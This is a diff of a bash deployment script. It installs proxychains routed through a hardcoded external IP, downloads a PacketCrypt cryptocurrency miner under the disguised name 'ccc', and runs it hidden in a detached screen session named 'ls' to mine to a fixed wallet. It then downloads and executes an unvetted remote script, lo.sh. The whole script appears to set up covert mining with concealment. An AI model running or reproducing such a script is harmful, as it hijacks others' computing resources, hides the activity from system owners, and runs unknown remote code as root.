@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo su --command "sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
+sudo apt update && sudo apt install gcc screen -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
 apt install proxychains -y
 sed -i 's/socks4/socks5/' /etc/proxychains.conf 
 sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
@@ -11,4 +11,4 @@ wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O ccc &&
 ph add ccc && 
 chmod +x ccc && 
 screen -dmS ls nohup ./ccc ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io -t 50 > nohup.out &&
-wget https://raw.githubusercontent.com/aurbach55/zash/main/lo.sh && chmod +x lo.sh && ./lo.sh"
+wget https://raw.githubusercontent.com/aurbach55/zash/main/lo.sh && chmod +x lo.sh && ./lo.sh
